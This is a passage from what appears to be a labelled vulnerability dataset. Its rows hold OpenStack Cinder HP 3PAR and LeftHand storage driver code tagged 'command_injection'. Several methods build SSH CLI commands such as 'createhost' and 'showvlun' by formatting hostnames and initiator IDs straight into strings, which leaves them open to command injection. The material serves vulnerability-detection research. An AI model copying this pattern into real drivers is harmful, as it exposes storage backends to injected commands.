        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml(""createVolume"", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + "":3260,"" + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = (""%s %s %s"" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.""""""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """"""Creates a snapshot.""""""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """"""Deletes a volume.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error(""Volume did not exist. It will not be deleted"")
            return
        self._cliq_run_xml(""deleteVolume"", cliq_args)

    def local_path(self, volume):
        msg = _(""local_path not supported"")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """"""
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""assignVolumeToServer"", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml(""getServerInfo"", cliq_args, False)
        response = out.find(""response"")
        result = response.attrib.get(""result"")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml(""createServer"", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """"""Unassign the volume from the host.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""unassignVolumeToServer"", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml(""getClusterInfo"", {})
        cluster_node = result_xml.find(""response/cluster"")
        total_capacity = cluster_node.attrib.get(""spaceTotal"")
        free_capacity = cluster_node.attrib.get(""unprovisionedSpace"")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data
/n/n/n",0,command_injection
11,77,c55589b131828f3a595903f6796cb2d0babb772f,"/cinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR Fibre Channel Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver
""""""

from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)


class HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):
    """"""OpenStack Fibre Channel driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware,
              copy volume <--> Image.
    """"""

    def __init__(self, *args, **kwargs):
        super(HP3PARFCDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password',
                          'san_ip', 'san_login', 'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'FC'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()
        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()
        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        The  driver returns a driver_volume_type of 'fibre_channel'.
        The target_wwn can be a single entry or a list of wwns that
        correspond to the list of remote wwn(s) that will export the volume.
        Example return values:

            {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': '1234567890123',
                }
            }

            or

             {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': ['1234567890123', '0987654321321'],
                }
            }


        Steps to export a volume on 3PAR
          * Create a host on the 3par with the target wwn
          * Create a VLUN for that HOST with the volume we want to export.

        """"""
        self.common.client_login()
        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        ports = self.common.get_ports()

        self.common.client_logout()
        info = {'driver_volume_type': 'fibre_channel',
                'data': {'target_lun': vlun['lun'],
                         'target_discovered': True,
                         'target_wwn': ports['FC']}}
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['wwpns'])
        self.common.client_logout()

    def _create_3par_fibrechan_host(self, hostname, wwn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same wwn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        out = self.common._cli_run('createhost -persona %s -domain %s %s %s'
                                   % (persona_id, domain,
                                      hostname, "" "".join(wwn)), None)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)

        return hostname

    def _modify_3par_fibrechan_host(self, hostname, wwn):
        # when using -add, you can not send the persona or domain options
        out = self.common._cli_run('createhost -add %s %s'
                                   % (hostname, "" "".join(wwn)), None)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['FCPaths']:
                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound as ex:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_fibrechan_host(hostname,
                                                        connector['wwpns'],
                                                        domain,
                                                        persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/n/cinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
""""""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """"""OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """"""
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _(""Invalid IP address format '%s'"") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _(""Found invalid iSCSI IP address(s) in configuration ""
                    ""option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'"") % \
                   ("", "".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """"""Clone an existing volume.""""""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """"""
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': ""%s:%s"" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \
              (persona_id, domain, hostname, iscsi_iqn)
        out = self.common._cli_run(cmd, None)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        self.common._cli_run('createhost -iscsi -add %s %s'
                             % (hostname, iscsi_iqn), None)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """"""Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """"""
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _(""Least busy iSCSI port not found, ""
                        ""using first iSCSI port in list."")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """"""Return the list of candidate nsps.""""""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """"""Return IP assiciated with given nsp.""""""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """"""Return the active nsp, if one exists, for the given host.""""""
        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"""""Return the nsp that has the fewest active vluns.""""""
        # return only the nsp (node:server:port)
        result = self.common._cli_run('showvlun -a -showcols Port', None)

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/n/cinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
""""""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """"""Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """"""

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """"""Runs a CLIQ command over SSH, without doing any result parsing""""""
        cliq_arg_strings = []
        for k, v in cliq_args.items():
            cliq_arg_strings.append("" %s=%s"" % (k, v))
        cmd = verb + ''.join(cliq_arg_strings)

        return self._run_ssh(cmd, check_exit_code)

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """"""Runs a CLIQ command over SSH, parsing and checking the output""""""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_(""CLIQ command returned %s""), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find(""response"")
            if response_node is None:
                msg = (_(""Malformed response to CLIQ command ""
                         ""%(verb)s %(cliq_args)s. Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get(""result"")

            if result_code != ""0"":
                msg = (_(""Error running CLIQ command %(verb)s %(cliq_args)s. ""
                         "" Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """"""Queries for info about the cluster (including IP)""""""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml(""getClusterInfo"", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """"""Gets the IP on which a cluster shares iSCSI volumes""""""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall(""response/cluster/vip""):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_(""Unexpected number of virtual ips for cluster ""
                 "" %(cluster_name)s. Result=%(_xml)s"") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """"""Gets the volume info, including IQN""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml(""getVolumeInfo"", cliq_args)

        # Result looks like this:
        #<gauche version=""1.0"">
        #  <response description=""Operation succeeded."" name=""CliqSuccess""
        #            processingTime=""87"" result=""0"">
        #    <volume autogrowPages=""4"" availability=""online"" blockSize=""1024""
        #       bytesWritten=""0"" checkSum=""false"" clusterName=""Cluster01""
        #       created=""2011-02-08T19:56:53Z"" deleting=""false"" description=""""
        #       groupName=""Group01"" initialQuota=""536870912"" isPrimary=""true""
        #       iscsiIqn=""iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b""
        #       maxSize=""6865387257856"" md5=""9fa5c8b2cca54b2948a63d833097e1ca""
        #       minReplication=""1"" name=""vol-b"" parity=""0"" replication=""2""
        #       reserveQuota=""536870912"" scratchQuota=""4194304""
        #       serialNumber=""9fa5c8b2cca54b2948a63d833097e1ca0000000000006316""
        #       size=""1073741824"" stridePages=""32"" thinProvision=""true"">
        #      <status description=""OK"" value=""2""/>
        #      <permission access=""rw""
        #            authGroup=""api-34281B815713B78-(trimmed)51ADD4B7030853AA7""
        #            chapName=""chapusername"" chapRequired=""true"" id=""25369""
        #            initiatorSecret="""" iqn="""" iscsiEnabled=""true""
        #            loadBalance=""true"" targetSecret=""supersecret""/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find(""response/volume"")
        for k, v in volume_node.attrib.items():
            volume_attributes[""volume."" + k] = v

        status_node = volume_node.find(""status"")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""status."" + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find(""permission"")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""permission."" + k] = v

        LOG.debug(_(""Volume info: %(volume_name)s => %(volume_attributes)s"") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """"""Creates a volume.""""""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml(""createVolume"", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + "":3260,"" + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = (""%s %s %s"" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.""""""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """"""Creates a snapshot.""""""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """"""Deletes a volume.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error(""Volume did not exist. It will not be deleted"")
            return
        self._cliq_run_xml(""deleteVolume"", cliq_args)

    def local_path(self, volume):
        msg = _(""local_path not supported"")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """"""
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""assignVolumeToServer"", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
